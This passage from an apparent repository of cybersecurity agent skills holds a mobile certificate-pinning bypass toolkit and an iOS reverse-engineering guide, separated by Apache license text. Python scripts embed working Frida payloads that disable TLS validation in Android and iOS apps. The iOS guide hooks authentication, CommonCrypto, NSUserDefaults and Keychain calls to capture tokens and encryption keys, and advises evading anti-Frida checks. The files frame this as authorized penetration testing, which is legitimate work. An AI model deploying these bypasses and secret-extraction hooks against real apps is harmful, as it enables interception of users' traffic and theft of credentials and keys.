      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/assets/template.md =====
# Certificate Pinning Bypass Assessment Report

## Target
| Field | Value |
|-------|-------|
| Application | [APP_NAME] |
| Platform | [Android/iOS] |
| Pinning Method | [OkHttp/TrustManager/NSURLSession/TrustKit/Custom] |
| Bypass Method | [Objection/Frida/Manual] |
| Bypass Difficulty | [Easy/Medium/Hard] |

## Pinning Implementation Analysis
| Layer | Implementation | Bypass Status |
|-------|---------------|---------------|
| [Java/ObjC/Native] | [DETAILS] | [Bypassed/Not Bypassed] |

## Findings
1. [FINDING]

## Recommendations
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/references/api-reference.md =====
# API Reference — Performing Mobile App Certificate Pinning Bypass

## Libraries Used
- **subprocess**: Execute frida, objection, apktool, adb commands
- **pathlib**: Read decompiled APK smali files

## CLI Interface
```
python agent.py detect --apk app.apk
python agent.py frida --package com.example.app [--device emulator-5554]
python agent.py objection --package com.example.app
python agent.py proxy
```

## Core Functions

### `detect_pinning_implementation(apk_path)` — Static APK analysis
Decompiles APK with apktool. Searches smali for pinning indicators:
OkHttp CertificatePinner, X509TrustManager, network_security_config,
WebView SSL error handler, Conscrypt TrustManagerImpl, Certificate Transparency.

### `run_frida_bypass(package_name, device_id)` — Dynamic Frida bypass
Injects JavaScript to bypass: TrustManagerImpl.verifyChain, OkHttp CertificatePinner.check,
WebViewClient.onReceivedSslError.

### `run_objection_bypass(package_name)` — Objection framework bypass
Runs `android sslpinning disable` via objection exploration mode.

### `check_proxy_setup()` — Verify interception environment
Checks: Android proxy settings, system CA certificates, user-installed CA certs.

## Pinning Strength Classification
| Level | Criteria |
|-------|----------|
| STRONG | 3+ pinning implementations detected |
| MODERATE | 1-2 implementations |
| NONE | No pinning indicators found |

## Dependencies
```
pip install frida-tools objection
```
System: apktool, adb (Android Debug Bridge)

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/references/standards.md =====
# Standards Reference: Certificate Pinning Bypass

## OWASP Mobile Top 10 2024
| ID | Risk | Relevance |
|----|------|-----------|
| M5 | Insecure Communication | Pinning assessment as part of network security |
| M7 | Insufficient Binary Protections | Pinning as binary-level protection |

## OWASP MASVS v2.0
| Control | Description |
|---------|-------------|
| MASVS-NETWORK-1 | App uses TLS for all network communication |
| MASVS-NETWORK-2 | App performs certificate pinning for critical connections |
| MASVS-RESILIENCE-1 | App detects and responds to running in instrumented environment |

## CWE Mappings
| CWE | Title |
|-----|-------|
| CWE-295 | Improper Certificate Validation |
| CWE-297 | Improper Validation of Certificate with Host Mismatch |

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/references/workflows.md =====
# Workflows: Certificate Pinning Bypass

## Workflow 1: Escalating Bypass Approach
```
[Configure Burp proxy] --> [App connection fails?] --> [Yes: Pinning active]
                                                              |
                                          [Try Objection generic bypass]
                                                              |
                                                    [Traffic visible?]
                                                    /              \
                                              [Yes: Done]    [No: Advanced]
                                                              |
                                          [Identify pinning library]
                                          [frida-trace *Trust* *Pin*]
                                                              |
                                          [Write custom Frida script]
                                          [Target specific implementation]
                                                              |
                                          [Verify traffic capture]
```

## Decision Matrix
| Pinning Method | Bypass Tool | Difficulty |
|---------------|-------------|-----------|
| OkHttp CertificatePinner | Objection | Easy |
| Network Security Config | Manifest modification | Easy |
| Custom TrustManager | Frida hook | Medium |
| TrustKit | Objection or Frida | Medium |
| Native C/C++ validation | Frida Interceptor.attach | Hard |
| Certificate Transparency | Custom Frida script | Hard |

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for performing mobile app certificate pinning bypass testing — authorized testing only."""

import json
import argparse
import subprocess
from pathlib import Path


FRIDA_SSL_BYPASS_SCRIPT = """
Java.perform(function() {
    // TrustManagerImpl bypass
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function() {
        console.log('[*] Bypassed TrustManagerImpl.verifyChain');
        return Java.use('java.util.ArrayList').$new();
    };
    // OkHttp CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCerts) {
            console.log('[*] Bypassed OkHttp CertificatePinner for: ' + hostname);
        };
    } catch(e) { console.log('[!] OkHttp not found'); }
    // WebViewClient bypass
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            console.log('[*] Bypassed WebView SSL error');
            handler.proceed();
        };
    } catch(e) {}
});
"""


def detect_pinning_implementation(apk_path):
    """Detect certificate pinning implementation in an APK."""
    cmd = ["apktool", "d", apk_path, "-o", "/tmp/apk_decompile", "-f"]
    try:
        subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except FileNotFoundError:
        return {"error": "apktool not installed"}
    pinning_indicators = {
        "okhttp_pinner": "CertificatePinner",
        "trustmanager": "X509TrustManager",
        "network_security_config": "network_security_config",
        "ssl_pinning_webview": "onReceivedSslError",
        "conscrypt": "TrustManagerImpl",
        "certificate_transparency": "CertificateTransparency",
    }
    findings = {}
    smali_dir = Path("/tmp/apk_decompile")
    for smali_file in smali_dir.rglob("*.smali"):
        content = smali_file.read_text(encoding="utf-8", errors="replace")
        for indicator_name, pattern in pinning_indicators.items():
            if pattern in content:
                findings.setdefault(indicator_name, []).append(str(smali_file.relative_to(smali_dir)))
    nsc_file = smali_dir / "res" / "xml" / "network_security_config.xml"
    nsc_content = None
    if nsc_file.exists():
        nsc_content = nsc_file.read_text()
    return {
        "apk": apk_path,
        "pinning_detected": bool(findings),
        "implementations": {k: v[:5] for k, v in findings.items()},
        "network_security_config": nsc_content[:500] if nsc_content else None,
        "pinning_strength": "STRONG" if len(findings) >= 3 else "MODERATE" if findings else "NONE",
    }


def run_frida_bypass(package_name, device_id=None):
    """Launch Frida SSL pinning bypass against a running app."""
    script_path = Path("/tmp/frida_ssl_bypass.js")
    script_path.write_text(FRIDA_SSL_BYPASS_SCRIPT)
    cmd = ["frida", "-U", "-l", str(script_path), "-f", package_name, "--no-pause"]
    if device_id:
        cmd = ["frida", "-D", device_id, "-l", str(script_path), "-f", package_name, "--no-pause"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {
            "package": package_name,
            "script": "ssl_pinning_bypass",
            "output": result.stdout[:1000],
            "errors": result.stderr[:500] if result.stderr else None,
            "success": result.returncode == 0,
        }
    except FileNotFoundError:
        return {"error": "frida not installed — pip install frida-tools"}
    except subprocess.TimeoutExpired:
        return {"package": package_name, "status": "RUNNING", "note": "Frida is attached — use Ctrl+C to detach"}


def run_objection_bypass(package_name):
    """Use objection to disable SSL pinning on Android/iOS."""
    cmd = ["objection", "-g", package_name, "explore", "-s",
           "android sslpinning disable"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {
            "package": package_name,
            "tool": "objection",
            "output": result.stdout[:1000],
            "success": "disabled" in result.stdout.lower(),
        }
    except FileNotFoundError:
        return {"error": "objection not installed — pip install objection"}
    except Exception as e:
        return {"error": str(e)}


def check_proxy_setup():
    """Verify proxy setup for traffic interception."""
    checks = {}
    try:
        result = subprocess.run(["adb", "shell", "settings", "get", "global", "http_proxy"],
                                capture_output=True, text=True, timeout=10)
        proxy = result.stdout.strip()
        checks["android_proxy"] = proxy if proxy and proxy != "null" else "NOT_SET"
    except Exception as e:
        checks["android_proxy_error"] = str(e)
    try:
        result = subprocess.run(["adb", "shell", "ls", "/system/etc/security/cacerts/"],
                                capture_output=True, text=True, timeout=10)
        cert_count = len(result.stdout.strip().splitlines())
        checks["system_ca_certs"] = cert_count
    except Exception as e:
        checks["ca_cert_error"] = str(e)
    try:
        result = subprocess.run(["adb", "shell", "su", "-c", "cat /data/misc/user/0/cacerts-added/ 2>/dev/null | wc -l"],
                                capture_output=True, text=True, timeout=10)
        checks["user_ca_certs"] = result.stdout.strip()
    except Exception:
        checks["user_ca_certs"] = "unknown"
    return {"proxy_setup": checks}


def main():
    parser = argparse.ArgumentParser(description="Mobile App Certificate Pinning Bypass Agent (Authorized Only)")
    sub = parser.add_subparsers(dest="command")
    d = sub.add_parser("detect", help="Detect pinning in APK")
    d.add_argument("--apk", required=True)
    f = sub.add_parser("frida", help="Frida SSL bypass")
    f.add_argument("--package", required=True)
    f.add_argument("--device", help="Device ID")
    o = sub.add_parser("objection", help="Objection SSL bypass")
    o.add_argument("--package", required=True)
    sub.add_parser("proxy", help="Check proxy setup")
    args = parser.parse_args()
    if args.command == "detect":
        result = detect_pinning_implementation(args.apk)
    elif args.command == "frida":
        result = run_frida_bypass(args.package, args.device)
    elif args.command == "objection":
        result = run_objection_bypass(args.package)
    elif args.command == "proxy":
        result = check_proxy_setup()
    else:
        parser.print_help()
        return
    print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/scripts/process.py =====
#!/usr/bin/env python3
"""
Certificate Pinning Bypass Manager

Manages Frida scripts for bypassing SSL pinning on Android and iOS targets.
Provides pre-built bypass scripts and validates successful bypass.

Usage:
    python process.py --platform android --package com.target.app [--proxy-host 192.168.1.100]
"""

import argparse
import json
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

ANDROID_BYPASS_SCRIPT = """
Java.perform(function() {
    console.log("[*] Loading Android SSL pinning bypass...");

    // TrustManagerImpl (Android system)
    try {
        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.verifyChain.implementation = function() {
            console.log("[+] Bypassed TrustManagerImpl.verifyChain");
            return arguments[0];
        };
    } catch(e) { console.log("[-] TrustManagerImpl not found"); }

    // OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation =
            function(hostname, peerCertificates) {
                console.log("[+] Bypassed OkHttp3 pinning for: " + hostname);
            };
    } catch(e) { console.log("[-] OkHttp3 CertificatePinner not found"); }

    // SSLContext init
    try {
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        var Bypass = Java.registerClass({
            name: "com.bypass.TrustAll",
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        var SSLContext = Java.use("javax.net.ssl.SSLContext");
        SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;",
            "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").implementation =
            function(km, tm, sr) {
                console.log("[+] Bypassed SSLContext.init");
                this.init(km, [Bypass.$new()], sr);
            };
    } catch(e) { console.log("[-] SSLContext bypass failed"); }

    console.log("[*] Bypass script loaded successfully");
});
"""

IOS_BYPASS_SCRIPT = """
if (ObjC.available) {
    console.log("[*] Loading iOS SSL pinning bypass...");

    // SecTrustEvaluateWithError
    var SecTrustEvaluateWithError = Module.findExportByName("Security", "SecTrustEvaluateWithError");
    if (SecTrustEvaluateWithError) {
        Interceptor.replace(SecTrustEvaluateWithError,
            new NativeCallback(function(trust, error) {
                console.log("[+] Bypassed SecTrustEvaluateWithError");
                return 1;
            }, "bool", ["pointer", "pointer"])
        );
    }

    // NSURLSession delegate
    var resolver = new ApiResolver("objc");
    resolver.enumerateMatches("-[* URLSession:didReceiveChallenge:completionHandler:]", {
        onMatch: function(match) {
            Interceptor.attach(match.address, {
                onEnter: function(args) {
                    var handler = new ObjC.Block(args[4]);
                    var trust = new ObjC.Object(args[3]).protectionSpace().serverTrust();
                    var cred = ObjC.classes.NSURLCredential.credentialForTrust_(trust);
                    handler.invoke(0, cred);
                    console.log("[+] Bypassed NSURLSession delegate pinning");
                }
            });
        },
        onComplete: function() {}
    });

    console.log("[*] iOS bypass loaded");
}
"""


def run_bypass(platform: str, package: str, device_id: str = None) -> dict:
    """Deploy and run SSL pinning bypass script."""
    script = ANDROID_BYPASS_SCRIPT if platform == "android" else IOS_BYPASS_SCRIPT
    script_file = Path(f"/tmp/ssl_bypass_{platform}.js")
    script_file.write_text(script)

    cmd = ["frida", "-U", "-f", package, "-l", str(script_file), "--no-pause"]
    if device_id:
        cmd.extend(["-D", device_id])

    print(f"[*] Deploying {platform} SSL pinning bypass for {package}...")
    print(f"[*] Script saved to {script_file}")
    print(f"[*] Command: {' '.join(cmd)}")

    return {
        "platform": platform,
        "package": package,
        "script_path": str(script_file),
        "command": " ".join(cmd),
        "timestamp": datetime.now().isoformat(),
    }


def main():
    parser = argparse.ArgumentParser(description="SSL Pinning Bypass Manager")
    parser.add_argument("--platform", choices=["android", "ios"], required=True)
    parser.add_argument("--package", required=True, help="App package/bundle ID")
    parser.add_argument("--device-id", help="Device serial/UDID")
    parser.add_argument("--output", default="pinning_bypass.json", help="Output report")
    parser.add_argument("--execute", action="store_true", help="Execute bypass immediately")
    args = parser.parse_args()

    result = run_bypass(args.platform, args.package, args.device_id)

    with open(args.output, "w") as f:
        json.dump(result, f, indent=2)

    print(f"[+] Configuration saved: {args.output}")

    if args.execute:
        print("[*] Starting Frida bypass (Ctrl+C to stop)...")
        subprocess.run(result["command"].split())


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/SKILL.md =====
---
name: reverse-engineering-ios-app-with-frida
description: 'Reverse engineers iOS applications using Frida dynamic instrumentation
  to understand internal logic, extract encryption keys, bypass security controls,
  and discover hidden functionality without source code access. Use when performing
  authorized iOS penetration testing, analyzing proprietary protocols, understanding
  obfuscated logic, or extracting runtime secrets from iOS binaries. Activates for
  requests involving iOS reverse engineering, Frida iOS hooking, Objective-C/Swift
  method tracing, or iOS binary analysis.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- ios
- frida
- reverse-engineering
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1573
---
# Reverse Engineering iOS App with Frida

## When to Use

Use this skill when:
- Analyzing iOS app internals during authorized security assessments without source code
- Extracting encryption keys, API secrets, or proprietary protocol details from running iOS apps
- Understanding obfuscated Swift/Objective-C logic through runtime method tracing
- Bypassing complex security mechanisms (jailbreak detection, anti-tampering, anti-debugging)

**Do not use** this skill for unauthorized reverse engineering that violates terms of service or intellectual property law.

## Prerequisites

- Jailbroken iOS device with Frida server installed via Cydia/Sileo, or non-jailbroken device with Frida Gadget-injected IPA
- Python 3.10+ with `frida-tools` (`pip install frida-tools`)
- USB connection to iOS device
- class-dump or dsdump for Objective-C header extraction
- Hopper Disassembler or Ghidra for static binary analysis (complementary)
- Knowledge of Objective-C runtime and Swift name mangling

## Workflow

### Step 1: Extract and Analyze the Binary

```bash
# On jailbroken device, find app binary
ssh root@<device_ip>
find /var/containers/Bundle/Application/ -name "TargetApp" -type f

# Pull decrypted binary (apps from App Store are encrypted with FairPlay)
# Use frida-ios-dump or Clutch for decryption
pip install frida-ios-dump
dump.py com.target.app

# Extract Objective-C class headers
class-dump -H decrypted_binary -o headers/
ls headers/  # Lists all class header files
```

### Step 2: Enumerate Classes and Methods at Runtime

```javascript
// enumerate_classes.js - List all loaded classes
Java.perform(function() {});  // N/A for iOS

// iOS uses ObjC runtime
if (ObjC.available) {
    var classes = ObjC.classes;
    for (var className in classes) {
        if (className.indexOf("Target") !== -1 ||
            className.indexOf("Auth") !== -1 ||
            className.indexOf("Crypto") !== -1) {
            console.log("[Class] " + className);

            // List methods
            var methods = classes[className].$ownMethods;
            for (var i = 0; i < methods.length; i++) {
                console.log("  [Method] " + methods[i]);
            }
        }
    }
}
```

```bash
frida -U -n TargetApp -l enumerate_classes.js
```

### Step 3: Trace Method Calls with frida-trace

```bash
# Trace all methods of a class
frida-trace -U -n TargetApp -m "*[TargetAuth *]"

# Trace specific patterns
frida-trace -U -n TargetApp -m "*[*Crypto* *]"
frida-trace -U -n TargetApp -m "*[*KeyChain* *]"
frida-trace -U -n TargetApp -m "*[*Token* *]"

# Trace Swift methods (mangled names)
frida-trace -U -n TargetApp -m "*[*$s*Auth*]"
```

### Step 4: Hook and Modify Method Behavior

```javascript
// hook_auth.js - Intercept authentication logic
if (ObjC.available) {
    // Hook Objective-C method
    var AuthManager = ObjC.classes.AuthManager;
    if (AuthManager) {
        Interceptor.attach(AuthManager["- validateToken:"].implementation, {
            onEnter: function(args) {
                // args[0] = self, args[1] = selector, args[2+] = method args
                var token = new ObjC.Object(args[2]);
                console.log("[Auth] validateToken called with: " + token.toString());
            },
            onLeave: function(retval) {
                console.log("[Auth] validateToken returned: " + retval);
                // Optionally modify return value
                // retval.replace(ptr(1));  // Force return true
            }
        });
    }

    // Hook CommonCrypto for encryption analysis
    var CCCrypt = Module.findExportByName("libcommonCrypto.dylib", "CCCrypt");
    if (CCCrypt) {
        Interceptor.attach(CCCrypt, {
            onEnter: function(args) {
                this.operation = args[0].toInt32();  // 0=encrypt, 1=decrypt
                this.algorithm = args[1].toInt32();  // 0=AES128, 1=DES, 2=3DES
                this.keyLength = args[4].toInt32();
                this.key = Memory.readByteArray(args[3], this.keyLength);
                console.log("[CCCrypt] Op:" + (this.operation === 0 ? "Encrypt" : "Decrypt"));
                console.log("[CCCrypt] Key: " + hexify(this.key));
            },
            onLeave: function(retval) {
                console.log("[CCCrypt] Status: " + retval);
            }
        });
    }
}

function hexify(buffer) {
    var bytes = new Uint8Array(buffer);
    var hex = [];
    for (var i = 0; i < bytes.length; i++) {
        hex.push(("0" + bytes[i].toString(16)).slice(-2));
    }
    return hex.join("");
}
```

### Step 5: Analyze Swift Code

```javascript
// swift_analysis.js - Hook Swift methods
// Swift methods use name mangling: $s<module><class><method>
// Use frida-trace to discover actual mangled names first

if (ObjC.available) {
    // Swift classes that inherit from NSObject are accessible via ObjC runtime
    var swiftClasses = Object.keys(ObjC.classes).filter(function(name) {
        return name.indexOf("_TtC") === 0 || name.indexOf("TargetApp.") !== -1;
    });

    swiftClasses.forEach(function(className) {
        console.log("[Swift] " + className);
        var methods = ObjC.classes[className].$ownMethods;
        methods.forEach(function(method) {
            console.log("  " + method);
        });
    });
}

// For pure Swift (non-ObjC-bridged), use Module.enumerateExports
Module.enumerateExports("TargetApp", {
    onMatch: function(exp) {
        if (exp.name.indexOf("Auth") !== -1 || exp.name.indexOf("Crypto") !== -1) {
            console.log("[Export] " + exp.name + " @ " + exp.address);
        }
    },
    onComplete: function() {}
});
```

### Step 6: Extract Secrets and Proprietary Data

```javascript
// extract_secrets.js
if (ObjC.available) {
    // Hook NSUserDefaults
    var NSUserDefaults = ObjC.classes.NSUserDefaults;
    Interceptor.attach(NSUserDefaults["- objectForKey:"].implementation, {
        onEnter: function(args) {
            this.key = new ObjC.Object(args[2]).toString();
        },
        onLeave: function(retval) {
            if (retval.isNull()) return;
            var value = new ObjC.Object(retval);
            console.log("[NSUserDefaults] " + this.key + " = " + value.toString());
        }
    });

    // Hook Keychain access
    var SecItemCopyMatching = Module.findExportByName("Security", "SecItemCopyMatching");
    Interceptor.attach(SecItemCopyMatching, {
        onEnter: function(args) {
            var query = new ObjC.Object(args[0]);
            console.log("[Keychain] Query: " + query.toString());
        },
        onLeave: function(retval) {
            console.log("[Keychain] Result: " + retval);
        }
    });
}
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **Objective-C Runtime** | Dynamic runtime enabling method dispatch, class introspection, and method swizzling at runtime |
| **Swift Name Mangling** | Compiler-applied encoding of Swift function signatures into linker-compatible symbol names |
| **FairPlay DRM** | Apple's encryption applied to App Store binaries; must be decrypted before static analysis |
| **class-dump** | Tool extracting Objective-C class declarations from Mach-O binaries for header-level analysis |
| **CommonCrypto** | Apple's C-level cryptographic library; primary target for encryption key extraction via Frida hooks |

## Tools & Systems

- **Frida**: Dynamic instrumentation framework for iOS runtime hooking and method interception
- **frida-trace**: Automated tracing utility that generates handler stubs for matched methods
- **frida-ios-dump**: Tool for decrypting FairPlay-protected iOS apps via memory dumping
- **class-dump / dsdump**: Objective-C header extraction from Mach-O binaries
- **Ghidra**: NSA's reverse engineering framework for static ARM64 binary analysis of iOS apps

## Common Pitfalls

- **FairPlay encryption**: Apps downloaded from the App Store are encrypted. You must decrypt before static analysis. Use frida-ios-dump on a jailbroken device.
- **Swift-only classes**: Pure Swift classes without `@objc` annotation are not visible through `ObjC.classes`. Use `Module.enumerateExports()` instead.
- **Stripped binaries**: Release builds strip debug symbols. Combine frida-trace with class-dump output for effective analysis.
- **Anti-Frida measures**: Sophisticated apps check for Frida artifacts (frida-server process, Frida agent strings in memory, injected libraries in dyld). Use stealthy Frida builds or Frida Gadget injection.

===== END FILE =====


===== FILE: skills/reverse-engineering-ios-app-with-frida/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

